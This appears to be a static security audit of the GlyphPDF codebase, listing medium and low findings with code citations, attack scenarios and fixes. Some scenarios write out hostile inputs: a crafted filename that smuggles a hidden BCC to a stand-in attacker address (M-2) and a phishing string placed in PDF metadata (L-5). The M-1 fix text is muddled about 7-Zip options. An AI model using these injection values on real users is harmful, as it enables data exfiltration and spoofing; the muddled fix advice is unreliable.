# SECURITY AUDIT — GlyphPDF full-codebase sweep

- **Date:** 2026-09-25 (executed 2026-09-29)
- **Auditor:** security-auditor (Wave 1, full-codebase lane)
- **Branch:** `audit/sweep-all` — AUDIT-ONLY, no production changes
- **Base commit:** `7eb5c67b` (fix(signing): 1.7c — B-LT DSS append /Info)
- **Scope:** entire `src/` tree (~99k LOC, 379 files): app, core, engines (pdfium/podofo/qpdf/formjs/ocr/ai/mrc/conversion/scheduling), modes, shell/controllers, ui, commands, docmodel, pdfws_djot, util
- **Method:** evidence-first static analysis (trust-boundary mapping first, then per-surface deep reads + grep signature sweeps). Every finding carries a `file:line` citation and a failure scenario.

## Verdict summary

**0 CRITICAL / 0 HIGH / 6 MEDIUM / 11 LOW / 4 INFORMATIONAL.**

The security-critical core (secret store, signing/certification, update pipeline, QuickJS form sandbox, SafeSave commit machinery, temp-file ownership) is visibly hardened by prior fix waves (EC04, SEP13, PGR-*, SWEEP-W1/W2, CX-*, N-*, B-03, S4-1): every examined primitive fails closed, uses atomic checked replacement, bounds attacker-influenced resources, and discloses degradation honestly. The findings below are the residue — concentrated in (a) consent/disclosure consistency across secondary dispatch lanes, (b) credential handling on external-tool boundaries, (c) the non-Windows porting surface, and (d) long-tail hardening of the signature validation read path.

## Findings index

| ID | Sev | CWE | Title | File |
|----|-----|-----|-------|------|
| M-1 | MEDIUM | CWE-214 | 7-Zip package password passed on the process command line | shell/controllers/HomeController.cpp:521-540 |
| M-2 | MEDIUM | CWE-93 | mailto header injection via unencoded filename interpolation (hidden BCC) | shell/controllers/HomeController.cpp:467-468 |
| M-3 | MEDIUM | CWE-862 | OCSP network-consent gate bypassed on the send-for-signing lane | shell/controllers/SendForSigningController.cpp:168-197 |
| M-4 | MEDIUM | CWE-377 | Signing/external-tool candidates staged in the SHARED temp root with default permissions | engines/SafeSave.cpp:73-89 |
| M-5 | MEDIUM | CWE-321 | Non-Windows fallback secret store: public-seed key file written without restrictive permissions | core/EncryptedFileSecretStore.cpp:157-163, 440-466 |
| M-6 | MEDIUM | CWE-347 | TSA/OCSP responses embedded/trusted without verifying the responder chain; https→https redirects followed | engines/SignatureManager.cpp:1478-1531, 262-299 |
| L-1 | LOW | CWE-347 | validateSignatures honors embedded DSS OCSP without OCSP_basic_verify — forged "Revoked" (fail-closed trust DoS) | engines/SignatureManager.cpp:3064-3104 |
| L-2 | LOW | CWE-190/681 | int truncation / overflow-adjacent casts on attacker-controlled ByteRange integers | engines/SignatureManager.cpp:53-60, 981-982, 2649-2650, 2671, 2702 |
| L-3 | LOW | CWE-316 | PKCS#12 password (and credential read-backs) not zeroized | engines/SignatureManager.cpp:304-323; core/CredentialManager.cpp:58-68 |
| L-4 | LOW | CWE-327 | Weak-key policy is RSA-only — short EC keys neither refused at sign nor flagged at validate | engines/SignatureManager.cpp:1432-1441, 2859-2867 |
| L-5 | LOW | CWE-116 | Document metadata interpolated unescaped into rich-text-capable QMessageBox (dialog spoofing) | shell/controllers/HomeController.cpp:622-637 |
| L-6 | LOW | CWE-770 | Update download lacks transfer timeout and byte cap (manifest path has both) | core/UpdateChecker.cpp:272-316 |
| L-7 | LOW | CWE-708/316 | `#define private public` ODR hack (contained) + FEK vector never zeroized | engines/podofo/PdfEncryptPubSec.cpp:36-40, 103 |
| L-8 | LOW | CWE-494 | OCR traineddata fetched over HTTPS without integrity pinning, parsed in-process | engines/OcrEngine.cpp:83-153 |
| L-9 | LOW | CWE-489 | Dormant GLYPHPDF_TESTING OCSP local-fixture bypass in production TU | engines/SignatureManager.cpp:380-405, 1786-1796 |
| L-10 | LOW | CWE-693 | Candidate verify-read compares secrets with `==` (non-constant-time) and `hasSecret` decrypts | core/EncryptedFileSecretStore.cpp:471, 624-627 |
| L-11 | LOW | CWE-400 | httpPost semaphore wait has no cancel coupling to an aborted reply (bounded, but retry-stormable) | engines/SignatureManager.cpp:262-299 |
| I-1 | INFO | — | Legacy 0x01/0x02 secret-blob acceptance windows (documented migration; follow-up to hard-reject 0x02) | core/EncryptedFileSecretStore.cpp:59-104 |
| I-2 | INFO | — | PubSec GCM blobs carry no object-identity AAD (parity with PDF AESV3 standard design) | engines/podofo/PdfEncryptPubSec.cpp:147-190 |
| I-3 | INFO | — | `PdfEncryptPubSec::Authenticate` always returns Owner (by design for recipient-installed FEK) | engines/podofo/PdfEncryptPubSec.cpp:296-303 |
| I-4 | INFO | — | No secrets material in logs (verified by sweep); service names only | grep sweep, qWarning/qDebug password/secret |

## Detailed findings

### M-1 — MEDIUM — CWE-214: 7-Zip package password on the process command line

- **Where:** `src/shell/controllers/HomeController.cpp:521-527` (buildArgs) and `:531-540` (validateCandidate), executed via `SafeSave::runExternalWriterCommit` → `QProcess::start` (`src/engines/SafeSave.cpp:97-134`).
- **Evidence:** `QStringList{ "a", "-tzip", "-mem=AES256", "-p" + password, ... }` — the AES-256 ZIP password is a process argument, and again for the `7z t` read-back.
- **Attacker/failure scenario:** On Linux, `/proc/<pid>/cmdline` is world-readable for the lifetime of the 7-Zip run (up to the 120 s bound): any local user reads `-p<password>` and decrypts the exported "secure sharing" package, defeating its purpose. On Windows, any process running as the same user (and administrators/audit tooling) sees the argument. The password protects a document the user considered sensitive enough to encrypt before sharing.
- **Fix:** Deliver the password off the command line — 7-Zip supports reading the password from stdin (`-p` with `-i`-style input is version-dependent; the robust pattern is `-pip@` / `-wcd`-style prompt avoidance is not available, so the practical fix is piping via stdin using `-p` with an empty password and `-sccUTF-8` interactive input, or switching to an in-process library (minizip-ng/LibreCrypto) that takes the key in memory. Minimum hardening: document the exposure + shorten the window; preferred fix: in-process AES-256 zip writer (the app already ships an AES-256-GCM primitive in EncryptedFileSecretStore/OpenSSL).

### M-2 — MEDIUM — CWE-93: mailto header injection → hidden BCC exfiltration

- **Where:** `src/shell/controllers/HomeController.cpp:467-468` (`shareViaEmail` non-MAPI fallback).
- **Evidence:** `QString url = QString("mailto:?subject=%1&body=%2").arg(subject).arg(body);` — neither value is percent-encoded (`QUrl::toPercentEncoding` absent). `subject = tr("PDF Document: %1").arg(fileName)` and `fileName = QFileInfo(filePath).fileName()`.
- **Attacker/failure scenario:** An attacker emails a victim a PDF named `q1 report&bcc=attacker@evil.example.pdf`. The victim opens it in GlyphPDF and uses Share ▸ Email attachment. On the mailto fallback path (non-Windows, or when `mapi32.dll` fails to load), the composed URL is `mailto:?subject=PDF Document: q1 report&bcc=attacker@evil.example&body=...` — the mail client pre-fills a **hidden BCC to the attacker**. The user sees the To field empty/normal, attaches the (often confidential, received) document and sends. Information disclosure with user interaction.
- **Fix:** Percent-encode: `QString url = QStringLiteral("mailto:?subject=%1&body=%2").arg(QString::fromUtf8(QUrl::toPercentEncoding(subject)), QString::fromUtf8(QUrl::toPercentEncoding(body)));` — or build via `QUrlQuery::addQueryItem`, which encodes.

### M-3 — MEDIUM — CWE-862: OCSP network-consent gate bypassed on the send-for-signing lane

- **Where:** `src/shell/controllers/SendForSigningController.cpp:168-197` — the multi-signer fill flow copies `cfg.level`/`cfg.tsaUrl` into `FillStepInput` and dispatches `SigningRequestRunner::runFillStep` (line 283) **with no `OcspConsent::obtain()` call**. Contrast `src/shell/controllers/SecurityController.cpp:223-238`, where the single-document sign path refuses B-LT/B-LTA dispatch without per-document (or global "never") OCSP consent.
- **Evidence:** `grep -rn OcspConsent src/shell/controllers/SendForSigningController.cpp` → zero hits; `runFillStep` applies `signing.setTsaUrl(in.tsaUrl); signing.setSignatureLevel(in.requestedLevel);` (`src/core/SigningRequestRunner.cpp:308-309`) and `signDocumentImpl` then fetches OCSP from the certificate's AIA responder whenever `level >= B_LT` (`src/engines/SignatureManager.cpp:1746-1813`).
- **Attacker/failure scenario:** A user (or an org policy: `signing/ocspNetworkPolicy = "never"`) who opted out of OCSP network egress still emits the responder request whenever signing happens through the send-for-signing workflow. The disclosure surface (`src/core/NetworkTouchpoints.cpp:89-110`) claims the OCSP touchpoint state is the EFFECTIVE policy value — the network-audit page says "disabled" while the next workflow step performs the fetch. This is both a consent violation and a disclosure lie, the exact gap class the R24 wiring closed for the main lane.
- **Fix:** Call `gp::OcspConsent::obtain(_mainWindow, input.docPath)` + `egressAllowed` in `SendForSigningController` before the first `runFillStep` dispatch (and on level changes), mirroring SecurityController:223-238; alternatively move the gate into `SigningRequestRunner::precheck` so every dispatch lane shares one choke point.

### M-4 — MEDIUM — CWE-377: candidates staged in the shared temp root

- **Where:** `src/engines/SafeSave.cpp:73-89` (`makeUniqueCandidate`): `QDir candidateDir(QDir::tempPath() + "/glyphpdf-candidates")` — deliberately NOT `TempFileManager::appTempDir()`, which exists precisely to provide the per-instance, ownership-marked, fail-closed session directory (WP-R10, `src/core/TempFileManager.cpp:266-315`).
- **Evidence:** All signing results (`SignatureManager::signDocumentImpl` line 1684), fill-step results (`SigningRequestRunner.cpp:289`), timestamp candidates, and external-tool outputs (`runExternalWriterCommit`, SafeSave.cpp:148) materialize in that shared directory. `QTemporaryFile` creates 0600 files, but `runExternalWriterCommit` **removes its own reservation before the external tool runs** (SafeSave.cpp:160) — the tool then creates the candidate with default umask (0644 on Linux), inside a `mkpath`-created 0755 directory.
- **Attacker/failure scenario:** On a multi-user Linux host (the NATIVE-LINUX-READINESS target), while the user signs, compresses (MRC), or packages a confidential document, another local user reads the in-flight candidate — the full document bytes — directly from `/tmp/glyphpdf-candidates/`. On Windows the per-user %TEMP% ACL confines this to same-user malware (low marginal impact).
- **Fix:** Move `makeUniqueCandidate` under `TempFileManager::appTempDir()` (the fail-closed private session root), or `mkpath` with 0700 and apply `QFile::setPermissions(ReadOwner|WriteOwner)` to every candidate as soon as it is produced by an external tool.

### M-5 — MEDIUM — CWE-321: non-Windows fallback secret store — public-seed key + default file permissions

- **Where:** `src/core/EncryptedFileSecretStore.cpp:157-163` (`resolveKey` seed = home path + machineUniqueId + constant — the code itself documents "identifiers, not confidential entropy"), and `:440-466` — `QSaveFile`/`QFile` writes with no permission hardening; on Linux the store lands 0644 (umask 022).
- **Attacker/failure scenario:** On a Linux build compiled **without** `HAS_LIBSECRET`, `CredentialManager::storeKey` writes AI provider keys to `secrets.enc.json` whose "encryption" key any local user can recompute (home path and machineUniqueId are public: `/home/<user>`, `/etc/machine-id`). Combined with 0644 permissions, **every local user can read the stored API keys** — not just the owner. The header honestly labels this "obfuscation only" (EncryptedFileSecretStore.h:56-60), but the file permission widens the audience beyond the design's implicit same-user assumption.
- **Fix:** Minimum: `QSaveFile::setPermissions(QFile::ReadOwner | QFile::WriteOwner)` before commit (and `mkpath` the store dir 0700). Preferred: treat "no OS keystore + no libsecret" as the loud failure it already is on Linux-with-libsecret (L07) and refuse secret storage there, rather than writing obfuscation-grade ciphertext.

### M-6 — MEDIUM — CWE-347: TSA/OCSP responses accepted without responder-chain verification

- **Where:** `src/engines/SignatureManager.cpp:1478-1531` (B-T embed): the TSA response is checked with `d2i_TS_RESP` (a *parse* only) and embedded as the `id-aa-timeStampToken` unsigned attribute — `TS_RESP_verify_token` / `TS_RESP_verify_signature` is never called, so the token's signer certificate is not validated against any trust store. Same class for OCSP: `fetchOcspResponse` (line 374-459) trusts the AIA URL from the (attacker-influenceable) certificate, and `httpPost` (line 262-299) sets **no redirect policy** (Qt 6 default `NoLessSafeRedirectPolicy` blocks scheme downgrade but follows https→https to a *different host*).
- **Attacker/failure scenario:** (a) A compromised or DNS/TLS-redirected TSA endpoint feeds a DER-parseable token signed by a rogue cert; the app embeds it, sets `timestampTokenValid = true`, and reports PAdES B-T attained — false assurance written into the document (external verifiers reject it later). (b) Same for the OCSP response embedded into the DSS at line 1784 — that path *does* run `OCSP_basic_verify`, which is why (a) is the concrete residual.
- **Fix:** Before embedding: `TS_RESP_verify_token` with a trust store + policy (or at minimum `TS_RESP_verify_signature` + cert-purpose check); set `QNetworkRequest::RedirectPolicyAttribute = ManualRedirectPolicy` on `httpPost`'s request and treat 3xx as failure (the pattern OllamaProvider already implements at OllamaProvider.cpp:323, 374-382).

### L-1 — LOW — CWE-347: embedded DSS OCSP honored without verification on the validation read path

- **Where:** `src/engines/SignatureManager.cpp:3064-3104` — OCSP entries read from the document's own /DSS (attacker-influenceable via an allowed incremental revision: the DSS subtree is on the INV-1 allowlist, line 2431-2432) are parsed, certID-matched (ER-1, public data), and their `V_OCSP_CERTSTATUS_REVOKED` / freshness verdicts are applied — with **no `OCSP_basic_verify` against the trust store** on this path. The nonce check is explicitly deferred (NF-6 note, line 3075-3080).
- **Failure scenario:** An attacker who can append an incremental revision adds a forged /DSS whose OCSP response carries a correctly-computed certID and `certStatus=revoked`; `validateSignatures` then reports a cryptographically-valid signature as **"Revoked"** — a fail-closed trust denial (the reverse direction cannot upgrade: "ValidWithDSS" comes from `hasDss` alone, and forged "good" responses change nothing).
- **Fix:** Run `OCSP_basic_verify` (with the trust store + signer chain) on the read path before honoring status; downgrade to "UntrustedChain" when verification fails. Persist the OCSP request nonce alongside the response to close NF-6.

### L-2 — LOW — CWE-190/681: int truncation on attacker-controlled ByteRange integers

- **Where:** `src/engines/SignatureManager.cpp:53-60` and `:976-984` (`extractCmsFromContents` / `extractSignatureContentsRaw`: bounds check `off1 + len1 > fileData.size()` computed from unvalidated int64 PDF numbers — signed overflow is UB before the check; results then `static_cast<int>`-truncated into `QByteArray::mid`), `:2649-2650`, `:2671`, `:2702` (int casts — safe only because the earlier int64 bounds check at 2618-2624 and the explicit ≤ `INT_MAX` gate at 2715-2723 constrain them, but 2649-2650 runs *before* 2715 and compares `static_cast<int>` against `qsizetype` for documents > 2 GiB).
- **Failure scenario:** A crafted document with ByteRange values near 2^63 makes `off1 + len1` overflow (UB; in practice wraps negative and passes the check in `extractSignatureContentsRaw`), producing wrong VRI material or a silent "Unsigned" classification. Under UBSan this is a hard diagnostic. Impact is confined to validation bookkeeping (mis-keyed VRI, cosmetic statuses), not memory corruption — `mid()` clamps.
- **Fix:** Hoist the `≤ numeric_limits<int>::max()` gate to the top of both range checks; perform all offset arithmetic in qint64 with `qAddOverflow`-style checks; replace `static_cast<int>` with the validated int variables throughout `extractCmsFromContents`.

### L-3 — LOW — CWE-316: PKCS#12 password not zeroized

- **Where:** `src/engines/SignatureManager.cpp:304-323` (`PKCS12_parse(p12, password.toStdString().c_str(), ...)` — the `std::string` temporary and the caller's QString copies of the P12 passphrase persist in the heap after use), `src/core/CredentialManager.cpp:58-68` (credential blob copied into `QByteArray bytes` then `QString` with no `OPENSSL_cleanse`). Contrast the good pattern already in-tree: `pkeyData` cleansed at SignatureManager.cpp:1535 and the ScrubOnScopeExit RAII in EncryptedFileSecretStore.cpp:49-55.
- **Fix:** Route the passphrase through a cleansed buffer (char vector + `OPENSSL_cleanse` RAII) and pass `char*` to `PKCS12_parse`; scrub the QByteArray in `credRead` before conversion.

### L-4 — LOW — CWE-327: weak-key policy is RSA-only

- **Where:** `src/engines/SignatureManager.cpp:1432-1441` (sign: refuses RSA < 2048 bits, silent on EC), `:2859-2867` and `:2966-2971` (validate: `WeakKey` status only for RSA).
- **Failure scenario:** A signer uses (or an attacker supplies a document signed with) an EC key over a ~160-bit curve; signing succeeds and validation reports `Valid` — no WeakKey disclosure, though such keys are computationally breakable. Fix: extend the check to `EVP_PKEY_EC` (refuse < 256 bits at sign; flag WeakKey at validate) and to DSA.

### L-5 — LOW — CWE-116: unescaped document metadata into rich-text-capable dialog

- **Where:** `src/shell/controllers/HomeController.cpp:622-637` — `title/author/subject/keywords/creator/producer` (all attacker-controlled PDF metadata) interpolated into `tr("<b>Title:</b> %1<br>")...` shown via `QMessageBox::information` (Qt::AutoText renders rich text when the string contains markup).
- **Failure scenario:** A crafted PDF whose Title contains `</b><h1>DOCUMENT CORRUPTED — RE-OPEN FROM: http://phishing…` renders formatted, app-styled content inside a system dialog — UI spoofing that can impersonate the application's own error/security messaging. (Qt rich text does not fetch remote images or run scripts by default, so impact is confined to visual spoofing.) Sibling sites `PresetManagerDialog.cpp:229` correctly use `toHtmlEscaped()`; CompareMode uses an `esc()` helper.
- **Fix:** `.arg(title.toHtmlEscaped())` (etc.) for all six fields.

### L-6 — LOW — CWE-770: update download lacks transfer timeout and byte cap

- **Where:** `src/core/UpdateChecker.cpp:272-278` — the manifest request sets `setTransferTimeout(20000)` + mid-flight 1 MiB cap (lines 129-149); the **download** request sets neither, and `onDownloadFinished` buffers `reply->readAll()` fully (line 316).
- **Failure scenario:** A hostile/compromised download host (HTTPS, vendor-linked but out of app control) streams unbounded bytes into Qt's reply buffer → memory exhaustion; or stalls forever with the progress dialog at 0% (no timeout) — DoS on the update UX. Integrity is not at risk (mandatory SHA-256 + Authenticode remain). Fix: mirror the manifest guards: `setTransferTimeout`, a byte cap aborted mid-flight (MSI size bound), and `setReadBufferSize`.

### L-7 — LOW — CWE-708/316: `#define private public` ODR hack + FEK lifetime

- **Where:** `src/engines/podofo/PdfEncryptPubSec.cpp:36-40` — access-specifier macro redefinition around `<podofo/podofo.h>` (documented ODR-level UB, contained to this TU with a `static_assert` sentinel); `:103` — `std::vector<unsigned char> m_fek` (the 32-byte file-encryption key) never cleansed on destruction, unlike the store's scrub discipline.
- **Fix:** File an upstream PoDoFo extension-point request (TODO(WP-7) already notes this) and track; add an RAII cleanse for `m_fek` (and the `encryptionKey` out-buffers at lines 130/301).

### L-8 — LOW — CWE-494: OCR traineddata fetched without integrity pinning

- **Where:** `src/engines/OcrEngine.cpp:83-153` — downloads `tessdata_best/<lang>.traineddata` from fixed HTTPS raw.githubusercontent (no redirects, size cap, allowlisted languages, strict path confinement — all good), then tesseract parses the payload **in-process**. No published hash pinned per release.
- **Failure scenario:** A supply-chain compromise of the upstream repo or the GitHub CA chain yields arbitrary bytes executed by tesseract's parser inside the app. Fix: ship per-language SHA-256 in the manifest/resources and verify before `QSaveFile` commit (the UpdateChecker pattern).

### L-9 — LOW — CWE-489: dormant test backdoor in a production TU

- **Where:** `src/engines/SignatureManager.cpp:380-405` (loads `<cert>_ocsp_response.der` from the certificate's directory) and `:1786-1796` (bypasses `OCSP_basic_verify` when that fixture file exists) — both gated on `GLYPHPDF_TESTING`, which is defined in **no tracked build file** (verified: only `tests/TestRedaction.cpp` references the macro; grep across all CMake files is empty), so production builds exclude the code.
- **Risk:** If the macro is ever defined for a release (misconfigured CI cache, "testing" package build), a local attacker who can plant a file next to the user's .p12 controls revocation verdicts. Fix: rename to a hard-to-accidentally-define symbol and add a release-build `#error` guard, or move behind an injected test seam like `setTrustStoreForTest`.

### L-10 — LOW — CWE-693: non-constant-time comparisons and decrypting presence checks

- **Where:** `src/core/EncryptedFileSecretStore.cpp:471` (`readSecret(service) == secret` post-write verification — compares secrets with `QString::==`), `:624-627` (`hasSecret` fully decrypts to test presence — timing/latency side channel on entry existence is negligible locally, but the decrypt-for-presence pattern is avoidable via a version-byte/marker probe).
- **Fix:** Constant-time compare for the verification step; a `hasEntry` that parses JSON without decrypting. Practical exploitability is low (local, same-user); recorded as hardening.

### L-11 — LOW — CWE-400: httpPost timeout window not coupled to reply abort

- **Where:** `src/engines/SignatureManager.cpp:276-299` — on semaphore timeout the reply is left running (function-local static `QNetworkAccessManager`); a signing retry storm against an unresponsive TSA can accumulate in-flight replies. Bounded by the 15 s transfer timeout per reply; contrast the owned-teardown pattern OllamaProvider.cpp:297-432 and UpdateChecker dtor.
- **Fix:** Keep a per-call `QPointer<QNetworkReply>` and abort it after `tryAcquire` fails, or reuse the OllamaProvider worker-owned loop pattern.

### I-1 — INFORMATIONAL — legacy secret-blob acceptance windows

`EncryptedFileSecretStore.cpp:59-104` documents that 0x01/0x02 remain readable for migration and that 0x02 is re-wrapped on first read. The in-code follow-up ("hard-reject 0x02 once the migration window has passed") should be scheduled — until then a planted legacy blob remains the one swappable-without-entropy artifact on Windows default-path stores.

### I-2 — INFORMATIONAL — PubSec GCM without object-identity AAD

`PdfEncryptPubSec.cpp:147-190` encrypts streams with a per-document FEK and no AAD binding `/ObjGen`; ciphertext blocks can be swapped between objects of the same document and decrypt with valid tags. This is parity with the PDF standard's AESV3 design (which also uses one key with no object binding), not a GlyphPDF defect; noted for the threat model.

### I-3 — INFORMATIONAL — `PdfEncryptPubSec::Authenticate` returns Owner unconditionally

`PdfEncryptPubSec.cpp:296-303`. Correct for the intended use (the FEK is installed only after the recipient CMS was unwrapped with the user's private key — possession is the authentication), but the object must never be installed on a parse of an *untrusted* document without that precondition. Verified call sites install it only on the app's own encrypt path.

### I-4 — INFORMATIONAL — secrets in logs: none found

The log sweep (qWarning/qDebug/qInfo/qCritical × password|secret|apikey|pkey) matches only service names and Win32 error codes — no key material, passphrases, or document paths beyond the user's own actions. `SupportBundle` is allowlist-built with a scrub pass (`SupportBundle.cpp:9-11`), `NetworkTouchpoints` reads effective policy values only.

## Explicitly checked and found sound (evidence for the 0-critical verdict)

- **Secret store crypto:** AES-256-GCM with entry identity as AAD; DPAPI v3 with service-name entropy; anti-forgery rejection of impossible blob versions on the Windows default path (PGR-20); lock-serialized read-modify-write with atomic commit and read-back verification (PGR-25); OPENSSL_cleanse RAII (PGR-10); legacy migration race closed (CX-06). `EncryptedFileSecretStore.cpp` end-to-end.
- **Signing boundary:** PGR-21/N06/E-6 checked replacement with destination SHA-256 preconditions; D6 post-condition re-validation failing closed on empty results (SEP13:4); shadow-attack scan INV-1 with DSS-only catalog allowlist (SignatureManager.cpp:2067-2475); weak-RSA refusal; /DocMDP no-silent-downgrade (E-01); partial-outcome honesty (E-02/§9.7).
- **SigningRequestRunner:** fail-closed mutation gate that treats an unrecorded hash as refusal; user re-confirmation kept out of the attacker-writable sidecar (SWEEP-W1 F3); anchor-mismatch and foreign-unsigned-field prechecks.
- **QuickJS form sandbox:** no libc modules (zero host I/O), whole-operation deadline with no gaps (the reproducible-bypass fix), JS heap + stack caps, host-side egress cap, `__proto__`-safe JSON snapshot embedding (PGR-38), hostile-getter discipline in every engine entry (FormJsSandbox.cpp).
- **Update pipeline:** HTTPS-only manifest+download, mandatory SHA-256 (B-03), Authenticode on the open handle with publisher match, TOCTOU re-verify (N-2/SECFIX-3), byte caps (S4-1).
- **AI egress:** parsed-loopback-only HTTP, HTTPS host allowlist with policy override, aggregate 96 KB content cap, manual redirects, bounded response buffering (R04/N-1/SECFIX-5/SEP13:6/R03).
- **CSV exports:** quote-doubling then formula-lead neutralization in the right order in both writers (`ConversionManager.cpp:497-542`, `MeasureMode.cpp:41-52`); the M3 plain-number exemption is narrow and regex-pinned.
- **Process execution:** `QProcess::start(program, args)` list-form only — no shell interpolation anywhere (`SafeSave.cpp`, `UpdateChecker.cpp`, `ConversionManager.cpp:659`); external writers never receive the destination as an argument (WP-R04).
- **OCR/path handling:** language allowlist, `..` refusal, AppLocalData confinement, installed-pack seeding before network fallback.
- **Temp ownership:** WP-R10 ownership markers, PID liveness, NoSymLinks, fail-closed session roots.

## Coverage matrix

```
Trust boundaries (file I/O, network, temp):      Complete
Secrets storage (DPAPI/secret-store stack):      Complete (all 3 backends read end-to-end)
Signing/certification stack:                     Complete (SignatureManager 3153 lines read end-to-end; runner, prechecks)
Signature VALIDATION read path:                  Complete
Update pipeline:                                 Complete
QuickJS sandbox + AForm shim boundary:           Complete (sandbox TU end-to-end; shim source pattern-checked)
Network surfaces (Ollama/OCR/TSA/OCSP):          Complete
Injection surfaces (CSV/HTML/cmdline/mailto):    Complete for all emitting sites found by sweep
Memory safety (backends/render/diff/match):      Partial — grep-signature + hotspot reads; not line-by-line over
                                                 PdfiumBackend/PoDoFoBackend/QpdfBackend 3rd-party glue
Concurrency (TOCTOU/races):                      Partial — save/commit/migration paths audited; lane scheduler
                                                 (LaneScheduler) reviewed at pattern level only
Error handling / fail-open:                      Complete (via per-surface reads; VerificationError classification
                                                 verified honest — E-03)
Information disclosure (logs/bundle/touchpoints):Complete
UI/controllers:                                  Partial — HomeController/SecurityController/SendForSigningController
                                                 deep; remaining controllers pattern-swept only
Packaging/scripts/third_party build scripts:     Skipped — out of src/ scope for this lane
Fuzz harnesses (fuzz/, DocumentFuzzer):          Not executed — static lane; harness presence noted
```

## Residuals / not reviewed (with reasons)

- **PoDoFo/PDFium/Qpdf/quickjs-ng upstream parser internals:** out of source-audit scope; the audit treats them as untrusted-input processors and checks our glue (bounds checks at every hand-off found sound). Upstream CVE posture should be tracked by a dependency-scanning lane.
- **Qt framework behavior claims** (rich-text resource loading, redirect defaults) are asserted at the level of documented Qt semantics for the linked Qt major version; a dynamic confirmation lane could pin them with probes.
- **tests/ tree:** production-readiness of tests not audited (test-only code); the pre-existing unstaged modification to `tests/TestSignatureRealCrypto.cpp` present at audit start was left untouched per lane rules.
- **`build-rel/`, `deploy/`, `dist/`, `packaging/`** artifacts: build outputs — out of scope.
- **Dynamic confirmation** of M-1 (/proc cmdline) and M-2 (mail client BCC behavior across clients) was not performed (static lane); both chains are code-evidenced.
